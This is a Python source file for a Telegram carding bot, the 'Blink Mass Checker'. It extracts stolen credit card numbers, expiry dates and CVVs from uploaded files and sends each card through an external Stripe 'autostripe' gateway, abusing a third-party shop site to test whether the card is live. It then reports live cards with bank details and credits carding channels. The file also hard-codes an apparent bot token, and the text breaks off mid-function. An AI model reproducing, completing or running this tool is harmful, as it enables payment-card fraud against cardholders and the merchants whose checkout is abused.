import logging
import sqlite3
import time
import requests
import re
import random
import string
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters
from datetime import datetime, timedelta

# Bot Configuration
TOKEN = "8209469146:AAEUMcuSBfC8NYxChFK0dQL-cnPVrqLdX1I" #Chage With Your Actul Bot Tokan#
OWNER_ID = 7896890222 #Chage Owner Id #
CHANNEL_USERNAME = "@balzeChT" #and change channel username #

# User Limits and Cooldowns
FREE_LIMIT = 300
PREMIUM_LIMIT = 600
OWNER_LIMIT = 1200
COOLDOWN_TIME = 300  # 5 minutes

# Store user files in memory
user_files = {}
active_checks = {}
stop_controllers = {}  # ADDED GLOBAL STOP CONTROLLERS

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# MILITARY STOP CONTROLLER CLASS - ADD THIS
class MassCheckController:
    """Military-grade stop controller"""
    def __init__(self, user_id):
        self.user_id = user_id
        self.should_stop = False
        self.last_check_time = time.time()
        self.active = True
    
    def stop(self):
        """Instant stop command"""
        self.should_stop = True
        self.active = False
        logger.info(f"FORCE STOPPED for user {self.user_id}")
    
    def should_continue(self):
        """Check if should continue processing"""
        self.last_check_time = time.time()
        return not self.should_stop and self.active

# Initialize database
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, status TEXT, cooldown_until REAL, join_date REAL)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS premium_codes
                 (code TEXT PRIMARY KEY, days INTEGER, created_at REAL, used_by INTEGER)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS redeemed
                 (user_id INTEGER, code TEXT, redeemed_at REAL, expires_at REAL)''')
    
    # Insert owner if not exists
    c.execute("INSERT OR IGNORE INTO users (user_id, status, join_date) VALUES (?, ?, ?)",
              (OWNER_ID, "owner", time.time()))
    
    conn.commit()
    conn.close()

# User management functions
def get_user_status(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT status FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    
    if not result:
        c.execute("INSERT INTO users (user_id, status, join_date) VALUES (?, ?, ?)",
                  (user_id, "free", time.time()))
        conn.commit()
        status = "free"
    else:
        status = result[0]
    
    # Check premium expiry
    if status == "premium":
        c.execute("SELECT expires_at FROM redeemed WHERE user_id=?", (user_id,))
        expiry = c.fetchone()
        if expiry and time.time() > expiry[0]:
            c.execute("UPDATE users SET status='free' WHERE user_id=?", (user_id,))
            conn.commit()
            status = "free"
    
    conn.close()
    return status

def get_user_limit(user_id):
    status = get_user_status(user_id)
    if user_id == OWNER_ID:
        return OWNER_LIMIT
    elif status == "premium":
        return PREMIUM_LIMIT
    else:
        return FREE_LIMIT

def is_on_cooldown(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT cooldown_until FROM users WHERE user_id=?", (user_id,))
    result = c.fetchone()
    
    conn.close()
    
    if result and result[0]:
        return time.time() < result[0]
    return False

def set_cooldown(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    cooldown_until = time.time() + COOLDOWN_TIME
    c.execute("UPDATE users SET cooldown_until=? WHERE user_id=?", (cooldown_until, user_id))
    
    conn.commit()
    conn.close()

# Channel check function
async def check_channel_membership(user_id, context):
    try:
        member = await context.bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status not in ['left', 'kicked']
    except Exception as e:
        logger.error(f"Channel check error: {e}")
        return False

# SIMPLE CC PARSER
def simple_cc_parser(text):
    """
    SIMPLE PARSER: Extract CCs from text
    """
    valid_ccs = []
    
    # Common CC patterns
    patterns = [
        # CC|MM|YYYY|CVV
        r'(\d{13,19})[\|/\s:\-]+(\d{1,2})[\|/\s:\-]+(\d{2,4})[\|/\s:\-]+(\d{3,4})',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            cc, month, year, cvv = match
            
            # Basic validation
            if len(cc) < 13 or len(cc) > 19:
                continue
                
            # Format month and year
            month = month.zfill(2)
            if len(year) == 2:
                year = "20" + year
                
            # CVV validation
            if cc.startswith(('34', '37')):  # Amex
                if len(cvv) != 4:
                    continue
            else:
                if len(cvv) != 3:
                    continue
                    
            valid_ccs.append((cc, month, year, cvv))
    
    return valid_ccs

def detect_card_type(cc_number):
    """Detect card type based on BIN"""
    if re.match(r'^4[0-9]{12}(?:[0-9]{3})?$', cc_number):
        return "VISA"
    elif re.match(r'^5[1-5][0-9]{14}$', cc_number):
        return "MASTERCARD"
    elif re.match(r'^3[47][0-9]{13}$', cc_number):
        return "AMEX"
    elif re.match(r'^6(?:011|5[0-9]{2})[0-9]{12}$', cc_number):
        return "DISCOVER"
    elif re.match(r'^3(?:0[0-5]|[68][0-9])[0-9]{11}$', cc_number):
        return "DINERS CLUB"
    elif re.match(r'^(?:2131|1800|35\d{3})\d{11}$', cc_number):
        return "JCB"
    else:
        return "UNKNOWN"

# BIN Lookup function
def bin_lookup(bin_number):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        logger.error(f"BIN lookup error: {e}")
    return None

# CC Check function
def check_cc(cc_number, month, year, cvv):
    start_time = time.time()
    
    cc_data = f"{cc_number}|{month}|{year}|{cvv}"
    
    # Your API endpoint
    url = f"https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=www.realoutdoorfood.shop/cc={cc_data}"
    
    try:
        response = requests.get(url, timeout=35)
        end_time = time.time()
        process_time = round(end_time - start_time, 2)
        
        if response.status_code == 200:
            response_text = response.text
            
            approved_keywords = ['approved', 'success', 'charged', 'payment added', 'live', 'valid']
            declined_keywords = ['declined', 'failed', 'invalid', 'error', 'dead']
            
            response_lower = response_text.lower()
            
            if any(keyword in response_lower for keyword in approved_keywords):
                return "approved", process_time, response_text
            elif any(keyword in response_lower for keyword in declined_keywords):
                return "declined", process_time, response_text
            else:
                if len(response_text.strip()) > 5:
                    return "approved", process_time, response_text
                else:
                    return "declined", process_time, response_text
        else:
            return "declined", process_time, f"HTTP Error {response.status_code}"
            
    except requests.exceptions.Timeout:
        return "error", 0, "Request Timeout (35s)"
    except requests.exceptions.ConnectionError:
        return "error", 0, "Connection Error"
    except Exception as e:
        return "error", 0, f"API Error: {str(e)}"

# FILE PARSER
def parse_cc_file(file_content):
    """Parse file and extract CCs"""
    try:
        if isinstance(file_content, (bytes, bytearray)):
            text_content = file_content.decode('utf-8', errors='ignore')
        else:
            text_content = str(file_content)
        
        # Use simple parser
        valid_ccs = simple_cc_parser(text_content)
        
        formatted_ccs = [f"{cc}|{month}|{year}|{cvv}" for cc, month, year, cvv in valid_ccs]
        
        return formatted_ccs
        
    except Exception as e:
        logger.error(f"File parsing error: {e}")
        return []

# VERTICAL BUTTON LAYOUT FUNCTION
def create_status_buttons(user_id, current_cc, status, approved_count, declined_count, checked_count, total_to_check):
    """Create VERTICAL button layout - LINE BY LINE"""
    keyboard = [
        # Line 1: Current CC
        [InlineKeyboardButton(f"𝘾𝙪𝙧𝙧𝙚𝙣𝙩 ➜ {current_cc[:8]}...", callback_data="current_info")],
        
        # Line 2: Status
        [InlineKeyboardButton(f" 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {status}", callback_data="status_info")],
        
        # Line 3: Approved
        [InlineKeyboardButton(f"✅ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ➜ {approved_count}", callback_data="approved_info")],
        
        # Line 4: Declined  
        [InlineKeyboardButton(f"❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ➜ {declined_count}", callback_data="declined_info")],
        
        # Line 5: Progress
        [InlineKeyboardButton(f"⏳ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ {checked_count}/{total_to_check}", callback_data="progress_info")],
        
        # Line 6: EMERGENCY STOP - RED COLOR
        [InlineKeyboardButton("☑️ 𝙎𝙏𝙊𝙋", callback_data=f"stop_check_{user_id}")]
    ]
    return InlineKeyboardMarkup(keyboard)

# AUTO FILE DETECTION HANDLER
async def handle_document(update: Update, context: CallbackContext):
    """Automatically detect when user uploads a file"""
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id, context):
        await update.message.reply_text("❌ Join our channel first to use this bot!")
        return
    
    document = update.message.document
    
    # Check if it's a text file
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a .txt file!")
        return
    
    try:
        # Download and parse the file
        await update.message.reply_text("𝘼𝙡𝙡 𝘾𝙘𝙨 𝘼𝙧𝙚 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜... 𝙗𝙤𝙩 𝙗𝙮 @BlackXCarding")
        file = await document.get_file()
        file_content = await file.download_as_bytearray()
        
        # Parse CCs
        cc_list = parse_cc_file(file_content)
        total_ccs = len(cc_list)
        
        if total_ccs == 0:
            await update.message.reply_text("""
❌ **No valid CCs found in file!**

Please ensure your file contains CCs in this format:
4147768578745265|04|2026|168 
5154620012345678|05|2027|123 
371449635398431|12|2025|1234
4147768578745265|11|2026|168 
371449635398431|02|2025|1234
5154620012345678|12|2027|123
            """)
            return
        
        # Store file data for this user
        user_files[user_id] = {
            'cc_list': cc_list,
            'file_name': document.file_name,
            'total_ccs': total_ccs,
            'timestamp': time.time()
        }
        
        # Get user limit
        user_limit = get_user_limit(user_id)
        
        # Create button message
        keyboard = [
            [InlineKeyboardButton("🚀 Check Cards", callback_data=f"start_check_{user_id}")],
            [InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_check_{user_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message_text = f"""
⏳ 𝙔𝙤𝙪𝙧 𝙁𝙞𝙡𝙡 𝘿𝙚𝙩𝙚𝙘𝙩𝙚𝙙 

✅ 𝙁𝙞𝙡𝙡 𝙉𝙖𝙢𝙚 ➜ `{document.file_name}`
☑️ 𝘾𝙖𝙧𝙙𝙨 𝙁𝙤𝙪𝙣𝙙 ➜ `{total_ccs}`
💎 𝙔𝙤𝙪𝙧 𝘾𝙘 𝙇𝙞𝙢𝙞𝙩 ➜ `{user_limit}` CCs

💎 𝘽𝙤𝙩 𝘽𝙮 ➜ @Blinkisop
☑️ 𝙅𝙤𝙞𝙣 𝙊𝙪𝙧 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝘼𝙣𝙙 𝙎𝙪𝙥𝙥𝙤𝙧𝙩 ➜ @BlackXCards

𝘾𝙡𝙞𝙘𝙠 𝙊𝙣 𝘾𝙝𝙚𝙘𝙠 𝘾𝙖𝙧𝙙𝙨 𝙏𝙤 𝘾𝙝𝙚𝙘𝙠 𝙔𝙤𝙪𝙧 𝘾𝙘𝙨 😎
        """
        
        await update.message.reply_text(message_text, reply_markup=reply_markup, parse_mode='Markdown')
        
    except Exception as e:
        logger.error(f"Document handling error: {e}")
        await update.message.reply_text(f"❌ Error processing file: {str(e)}")

# ENHANCED BUTTON HANDLER
async def handle_button(update: Update, context: CallbackContext):
    """Handle button clicks - COMPLETELY FIXED VERSION"""
    query = update.callback_query
    user_id = query.from_user.id
    callback_data = query.data
    
    await query.answer()
    
    logger.info(f"Button pressed: {callback_data} by user {user_id}")
    
    # START CHECK BUTTON
    if callback_data.startswith('start_check_'):
        target_user_id = int(callback_data.split('_')[2])
        
        if user_id != target_user_id:
            await query.message.reply_text("❌ This is not your file!")
            return
        
        await start_card_check(query, context, user_id)
        
    # STOP CHECK BUTTON - FIXED PARSING
    elif callback_data.startswith('stop_check_'):
        target_user_id = int(callback_data.split('_')[2])
        
        logger.info(f"Stop button pressed for user {target_user_id} by {user_id}")
        
        if user_id != target_user_id:
            await query.answer("❌ This is not your check!", show_alert=True)
            return
        
        # AGGRESSIVE STOP MECHANISM - MULTIPLE LAYERS
        stop_success = False
        
        # LAYER 1: Stop Controller
        if target_user_id in stop_controllers:
            stop_controllers[target_user_id].stop()
            logger.info(f"Stop controller activated for {target_user_id}")
            stop_success = True
        
        # LAYER 2: Active Checks
        if target_user_id in active_checks:
            active_checks[target_user_id] = False
            logger.info(f"Active checks stopped for {target_user_id}")
            stop_success = True
        
        # LAYER 3: Direct Global Flag
        if target_user_id in user_files:
            # Mark for immediate termination
            user_files[target_user_id]['force_stop'] = True
            logger.info(f"Force stop set for {target_user_id}")
            stop_success = True
        
        if stop_success:
            # INSTANT VISUAL FEEDBACK
            await query.edit_message_text(
                "🛑 **EMERGENCY STOP ACTIVATED!**\n\n" +
                "✅ Checking process terminated immediately!\n" +
                "📊 All resources freed!\n" +
                "🔧 Ready for new file upload!",
                parse_mode='Markdown'
            )
            logger.info(f"User {user_id} successfully stopped check {target_user_id}")
        else:
            await query.answer("❌ No active check found to stop!", show_alert=True)
        
    elif callback_data.startswith('cancel_check_'):
        target_user_id = int(callback_data.split('_')[2])
        
        if user_id != target_user_id:
            await query.message.reply_text("❌ This is not your file!")
            return
        
        # Remove user file data
        if user_id in user_files:
            del user_files[user_id]
        
        await query.edit_message_text("❌ **Check cancelled!**")
        
    elif callback_data == "check_join":
        await handle_join_callback(update, context)

# COMPLETE MASS CHECK FUNCTION WITH MILITARY STOP
async def start_card_check(query, context: CallbackContext, user_id: int):
    """MASS CHECK WITH BULLETPROOF STOP DETECTION"""
    
    if user_id not in user_files:
        await query.edit_message_text("❌ File data not found! Please upload again.")
        return
    
    if is_on_cooldown(user_id):
        await query.edit_message_text("⏳ **Cooldown Active!** Wait 5 minutes between mass checks.")
        return
    
    file_data = user_files[user_id]
    cc_list = file_data['cc_list']
    total_ccs = file_data['total_ccs']
    user_limit = get_user_limit(user_id)
    total_to_check = min(total_ccs, user_limit)
    
    # Set cooldown
    set_cooldown(user_id)
    
    # INITIALIZE MULTIPLE STOP LAYERS
    stop_controller = MassCheckController(user_id)
    stop_controllers[user_id] = stop_controller
    active_checks[user_id] = True
    user_files[user_id]['force_stop'] = False  # New direct stop flag
    
    # Create initial status
    status_text = "🚀 **Mass CC Check Started!**\n\n"
    reply_markup = create_status_buttons(
        user_id=user_id,
        current_cc="Starting...",
        status="Initializing",
        approved_count=0,
        declined_count=0,
        checked_count=0,
        total_to_check=total_to_check
    )
    
    status_msg = await query.edit_message_text(status_text, reply_markup=reply_markup)
    
    # Initialize counters
    approved_count = 0
    declined_count = 0
    checked_count = 0
    approved_ccs = []
    
    start_time = time.time()
    
    # PROCESS CCs WITH MULTI-LAYER STOP CHECKS
    for index, cc_data in enumerate(cc_list[:user_limit]):
        # LAYER 1: Stop Controller Check
        if not stop_controller.should_continue():
            logger.info(f"Stop controller triggered for user {user_id}")
            break
            
        # LAYER 2: Active Checks Flag
        if user_id not in active_checks or not active_checks[user_id]:
            logger.info(f"Active checks flag stopped for user {user_id}")
            break
            
        # LAYER 3: Direct Force Stop Flag
        if user_id in user_files and user_files[user_id].get('force_stop', False):
            logger.info(f"Force stop flag triggered for user {user_id}")
            break
            
        checked_count = index + 1
        
        try:
            cc_number, month, year, cvv = cc_data.split('|')
            card_type = detect_card_type(cc_number)
            
            # UPDATE STATUS
            status_text = "𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...\n\n"
            reply_markup = create_status_buttons(
                user_id=user_id,
                current_cc=cc_number,
                status="Checking...",
                approved_count=approved_count,
                declined_count=declined_count,
                checked_count=checked_count,
                total_to_check=total_to_check
            )
            
            try:
                await status_msg.edit_text(status_text, reply_markup=reply_markup)
            except Exception as e:
                logger.error(f"Message edit error: {e}")
            
            # PRE-API STOP CHECK
            if (not stop_controller.should_continue() or 
                user_id not in active_checks or 
                not active_checks[user_id] or
                (user_id in user_files and user_files[user_id].get('force_stop', False))):
                break
                
            # Check CC
            status, process_time, api_response = check_cc(cc_number, month, year, cvv)
            
            # POST-API STOP CHECK
            if (not stop_controller.should_continue() or 
                user_id not in active_checks or 
                not active_checks[user_id] or
                (user_id in user_files and user_files[user_id].get('force_stop', False))):
                break
                
            if status == "approved":
                approved_count += 1
                bin_info = bin_lookup(cc_number[:6])
                
                # ORIGINAL APPROVED MESSAGE
                approved_text = f"""
𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅

𝗖𝗖 ⇾ `{cc_number}|{month}|{year}|{cvv}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ Stripe Auth
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment added successfully

```
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 ➜  {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')}
𝗕𝗮𝗻𝗸 ➜  {bin_info.get('bank', 'N/A')}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➜  {bin_info.get('country_name', 'N/A')} {bin_info.get('country_flag', '')}```

𝗧𝗼𝗼𝗸 {process_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀
                """
                
                try:
                    await context.bot.send_message(chat_id=user_id, text=approved_text, parse_mode='Markdown')
                except Exception as e:
                    logger.error(f"Approved message send error: {e}")
                
                approved_ccs.append(cc_data)
            else:
                declined_count += 1
            
            # UPDATE STATUS AFTER CHECK
            status_text = "𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...\n\n"
            final_status = "✅ Live" if status == "approved" else "❌ Dead"
            reply_markup = create_status_buttons(
                user_id=user_id,
                current_cc=cc_number,
                status=final_status,
                approved_count=approved_count,
                declined_count=declined_count,
                checked_count=checked_count,
                total_to_check=total_to_check
            )
            
            try:
                await status_msg.edit_text(status_text, reply_markup=reply_markup)
            except Exception as e:
                logger.error(f"Status update error: {e}")
            
            # NON-BLOCKING DELAY WITH FREQUENT STOP CHECKS
            for i in range(10):
                # CHECK STOP EVERY 0.05 SECONDS
                if (not stop_controller.should_continue() or 
                    user_id not in active_checks or 
                    not active_checks[user_id] or
                    (user_id in user_files and user_files[user_id].get('force_stop', False))):
                    break
                await asyncio.sleep(0.05)
                
        except Exception as e:
            logger.error(f"CC processing error: {e}")
            declined_count += 1
            continue
    
    # COMPLETE CLEANUP
    if user_id in stop_controllers:
        del stop_controllers[user_id]
    if user_id in active_checks:
        del active_checks[user_id]
    if user_id in user_files:
        # Remove force_stop flag but keep file data if needed
        if 'force_stop' in user_files[user_id]:
            del user_files[user_id]['force_stop']
    
    # FINAL RESULTS
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    was_stopped = (
        (user_id in stop_controllers and stop_controllers[user_id].should_stop) or
        (user_id in user_files and user_files[user_id].get('force_stop', False))
    )
    
    if was_stopped:
        final_text = f"""
🛑 **CHECK STOPPED BY USER**

📊 **Partial Results:**
✅ Approved: {approved_count}
❌ Declined: {declined_count}  
🔢 Checked: {checked_count}
⏱️ Time: {total_time}s

⚡ Process terminated successfully!
        """
    else:
        final_text = f"""
✅ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙! 𝙎𝙀𝙭'𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙮
 
├📊 𝙎𝙩𝙖𝙩𝙪𝙨
├☑️ 𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙 ➜ {approved_count}
├❌ 𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙 ➜ {declined_count}
├💀 𝙏𝙤𝙩𝙖𝙡 ➜ {checked_count}  
├⏱️ Time: {total_time}s

⚡ 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚☑️
        """
    
    try:
        await status_msg.edit_text(final_text, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"Final message error: {e}")

# [REST OF THE CODE REMAINS THE SAME - start_command, chk_command, etc.]
# Continue with all the other functions exactly as in your original code...

# Custom command handler for dot commands
async def handle_custom_commands(update: Update, context: CallbackContext):
    """Handle .prefix commands manually"""
    if not update.message or not update.message.text:
        return
    
    text = update.message.text.strip()
    user_id = update.effective_user.id
    
    if text.startswith('.'):
        parts = text[1:].split(maxsplit=1)
        if not parts:
            return
            
        command = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""
        
        if command == 'start':
            await start_command(update, context)
        elif command == 'chk':
            if args:
                context.args = [args]
            else:
                context.args = []
            await chk_command(update, context)
        elif command == 'mtxt':
            await mtxt_manual_command(update, context)
        elif command == 'id':
            await id_command(update, context)
        elif command == 'code':
            if args:
                context.args = args.split()
            else:
                context.args = []
            await code_command(update, context)
        elif command == 'redeem':
            if args:
                context.args = args.split()
            else:
                context.args = []
            await redeem_command(update, context)
        elif command == 'broadcast':
            if args:
                context.args = args.split()
            else:
                context.args = []
            await broadcast_command(update, context)
        elif command == 'stats':
            await stats_command(update, context)

# Start command
async def start_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id, context):
        keyboard = [
            [InlineKeyboardButton("🔥 𝙅𝙊𝙄𝙉 𝙊𝙐𝙍 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 🔥", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
            [InlineKeyboardButton("✅ 𝙄'𝙑𝙀 𝙅𝙊𝙄𝙉𝙀𝘿", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        start_text = """
╔═══════════════════════╗
  𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 𝘽𝙡𝙞𝙣𝙠 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 
╚═══════════════════════╝

🔒 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗

⚠️ 𝙁𝙞𝙧𝙨𝙩 𝙅𝙤𝙞𝙣 𝙊𝙪𝙧 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝘽𝙧𝙤 😎

💎 𝗖𝗵𝗮𝗻𝗻𝗲𝗹: @BLAZE_X_007 ⏳
        """
        
        await update.message.reply_text(start_text, reply_markup=reply_markup)
        return
    
    user_status = get_user_status(user_id)
    welcome_text = f"""
╔════════════════════════╗      
   𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 𝘽𝙡𝙞𝙣𝙠 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 
╚════════════════════════╝

✅ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗚𝗿𝗮𝗻𝘁𝗲𝗱

📊 𝗬𝗼𝘂𝗿 𝗦𝘁𝗮𝘁𝘂𝘀: {user_status.upper()}

🔧 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:

• 𝙐𝙨𝙚 /chk 𝙏𝙤 𝘾𝙝𝙚𝙘𝙠 𝙎𝙞𝙣𝙜𝙡𝙚 𝘾𝙖𝙧𝙙𝙨

• 𝙅𝙪𝙨𝙩 𝙐𝙥𝙡𝙤𝙖𝙙 𝘼𝙣𝙮 𝙁𝙞𝙡𝙡 𝙞𝙣 .𝙩𝙭𝙩 𝙁𝙤𝙧𝙢𝙖𝙩

• 𝙐𝙨𝙚 /redeem 𝙏𝙤 𝙂𝙚𝙩 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨

😎 𝙐𝙨𝙚 /mtxt 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙁𝙤𝙧 𝙈𝙖𝙨𝙨 𝘾𝙝𝙠 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 

💎 𝗖𝗿𝗲𝗱𝗶𝘁𝘀 ➜ @BLAZE_X_007
    """
    
    await update.message.reply_text(welcome_text)

# Join callback handler
async def handle_join_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    
    if not await check_channel_membership(user_id, context):
        await query.answer("❌ You haven't joined the channel yet!", show_alert=True)
        return
    
    await query.answer("✅ Access Granted!")
    
    user_status = get_user_status(user_id)
    welcome_text = f"""
╔════════════════════════╗      
   𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙏𝙤 𝘽𝙡𝙞𝙣𝙠 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 😎
╚════════════════════════╝

✅ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗚𝗿𝗮𝗻𝘁𝗲𝗱

📊 𝗬𝗼𝘂𝗿 𝗦𝘁𝗮𝘁𝘂𝘀: {user_status.upper()}

🔧 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀:

• 𝙐𝙨𝙚 /chk 𝙏𝙤 𝘾𝙝𝙚𝙘𝙠 𝙎𝙞𝙣𝙜𝙡𝙚 𝘾𝙖𝙧𝙙𝙨

• 𝙅𝙪𝙨𝙩 𝙐𝙥𝙡𝙤𝙖𝙙 𝘼𝙣𝙮 𝙁𝙞𝙡𝙡 𝙞𝙣 .𝙩𝙭𝙩 𝙁𝙤𝙧𝙢𝙖𝙩

• 𝙐𝙨𝙚 /redeem 𝙏𝙤 𝙂𝙚𝙩 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨

😎 𝙐𝙨𝙚 /mtxt 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 𝙁𝙤𝙧 𝙈𝙖𝙨𝙨 𝘾𝙝𝙠 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 

💎 𝗖𝗿𝗲𝗱𝗶𝘁𝘀 ➜ @BLAZE_X_007
    """
    
    await query.edit_message_text(welcome_text)

# ID command
async def id_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    await update.message.reply_text(f"🆔 𝗬𝗼𝘂𝗿 𝗨𝘀𝗲𝗿 𝗜𝗗: `{user_id}`", parse_mode='Markdown')

# Manual mtxt command for backward compatibility
async def mtxt_manual_command(update: Update, context: CallbackContext):
    """Manual mtxt command for users who prefer commands"""
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id, context):
        await update.message.reply_text("❌ Join our channel first to use this bot!")
        return
    
    await update.message.reply_text("""
𝙃𝙤𝙬 𝙏𝙤 𝙐𝙨𝙚 /𝙢𝙩𝙭𝙩 𝘾𝙤𝙢𝙢𝙖𝙣𝙙 🍳

1. 𝙐𝙥𝙡𝙤𝙖𝙙 𝙖𝙣𝙮 𝙛𝙞𝙡𝙡 𝙞𝙣 .𝙩𝙭𝙩 𝙛𝙤𝙧𝙢𝙖𝙩 💎

2. 𝘽𝙤𝙩 𝘼𝙪𝙩𝙤 𝘿𝙚𝙩𝙚𝙘𝙩 𝙔𝙤𝙪𝙧 𝙁𝙞𝙡𝙡 𝘼𝙣𝙙 𝙎𝙚𝙣𝙙 𝙔𝙤𝙪 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 😎

3.𝙏𝙝𝙖𝙣 𝘾𝙡𝙞𝙘𝙠 𝙊𝙣 𝘾𝙝𝙚𝙘𝙠 𝘾𝙖𝙧𝙙𝙨 𝘽𝙪𝙩𝙩𝙤𝙣 ⏳
    """)

# Single CC Check command
async def chk_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    if not await check_channel_membership(user_id, context):
        await update.message.reply_text("❌ Join our channel first to use this bot!")
        return
    
    if len(context.args) == 0:
        await update.message.reply_text("""
💳 𝙃𝙤𝙬 𝙏𝙤 𝙐𝙨𝙚 𝙎𝙞𝙣𝙜𝙡𝙚 𝘾𝙝𝙠 𝘾𝙘𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙

𝙐𝙨𝙚 /chk 𝙏𝙝𝙖𝙣 𝙀𝙣𝙩𝙚𝙧 𝙔𝙤𝙪𝙧 𝘾𝙘

𝗨𝘀𝗮𝗴𝗲 ➜ `/chk 4879170029890689|02|2027|347`
        """)
        return
    
    cc_input = " ".join(context.args)
    valid_ccs = simple_cc_parser(cc_input)
    
    if not valid_ccs:
        await update.message.reply_text(f"""
❌ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗖𝗖 𝗳𝗼𝗿𝗺𝗮𝘁!

📝 𝗩𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁𝘀:
• `4147768578745265|04|2026|168`
🔧 𝗬𝗼𝘂𝗿 𝗜𝗻𝗽𝘂𝘁: `{cc_input}`
        """, parse_mode='Markdown')
        return
    
    cc_number, month, year, cvv = valid_ccs[0]
    card_type = detect_card_type(cc_number)
    bin_number = cc_number[:6]
    
    bin_info = bin_lookup(bin_number)
    processing_msg = await update.message.reply_text(f"""
⏳ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗖𝗮𝗿𝗱...

💳 𝗖𝗮𝗿𝗱: `{cc_number}`
🏷️ 𝗧𝘆𝗽𝗲: {card_type}
🆔 𝗕𝗜𝗡: {bin_number}

⏳𝘽𝙤𝙩 𝘽𝙮 ➜ @BLAZE_X_007
    """, parse_mode='Markdown')
    
    status, process_time, api_response = check_cc(cc_number, month, year, cvv)
    
    if status == "approved":
        # ✅ ORIGINAL SINGLE CHECK APPROVED MESSAGE
        result_text = f"""
